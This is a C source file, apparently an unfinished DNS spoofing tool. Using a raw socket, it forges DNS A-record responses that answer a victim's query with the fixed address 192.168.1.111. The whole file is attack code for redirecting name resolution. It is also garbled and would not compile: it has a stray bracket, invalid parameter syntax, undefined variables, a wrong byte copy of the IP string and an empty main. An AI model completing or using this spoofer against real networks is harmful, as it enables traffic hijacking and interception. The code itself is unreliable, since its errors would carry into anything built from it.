#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<arpa/inet.h>]
#include <time.h>
#include "dns.h"
#include "header.h"
#include <pcap/pcap.h>

#define SPOOF_ADDR "192.168.1.111"
void fill_iph(struct iphdr* iph,int src_ip,int server_ip,){
	iph->version=4;
	iph->tos=0;
	iph->ihl=5;
	iph->tot_len=htons(sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof(dns_header)+sizeof(r_element)+6);
	iph->id=htons(1);    
	iph->frag_off= htons(0);
	iph->ttl=100;
	iph->protocol=IPPROTO_UDP;
	iph->saddr=src_ip;
    iph->daddr=server_ip;
	iph->check=htons(checksum((char*) iph,iph->tot_len));
}

void respond(int src_ip,int src_port,int server_ip,int server_port, dns_header dnsh,char[2] domain){
    char* response[BUF_SIZE];
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    int hincl = 1;                  /* 1 = on, 0 = off */
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

	if(fd < 0)
	{
		perror("Error creating raw socket ");
		exit(1);
	}
    memset(response,0,BUF_SIZE);
	struct iphdr *iph = (struct iphdr *)response;
	struct udphdr *udph = (struct udphdr *)(response + sizeof(struct iphdr));

    fill_iph(iph,src_ip,server_ip);
    memcpy(response+sizeof(struct iphdr)+sizeof(struct udphdr),dnsh,sizeof(dnsh));
    memcpy(response+sizeof(struct iphdr)+sizeof(struct udphdr)+sizeof(dns_header),domain,2);
    r_element* answer =(r_element*)(response+sizeof(struct iphdr)+sizeof(struct udphdr)+sizeof(dns_header)+2);

    //fill udp header
    udph->source=server_port;
	udph->dest=src_port;
	udph->len=htons(8+data_size);

    //fill answer
    answer->type=htons(TYPE_A);
    answer->rdlength=htons(4);
    answer->ttl=htonl(1000);
    answer->_class=htons(CLASS_IN);

    memcpy(response+sizeof(struct iphdr)+sizeof(struct udphdr)+sizeof(dns_header)+2+sizeof(r_element),
            SPOOF_ADDR,4);
            
    struct sockaddr_in to;
	to.sin_addr.s_addr=src_ip;
	to.sin_family=AF_INET;
	to.sin_port=src_port;

    sendto(fd,packet,ntohs(iph->tot_len),0,&to,sizeof(to));
	perror("");


}

int main(){
	
}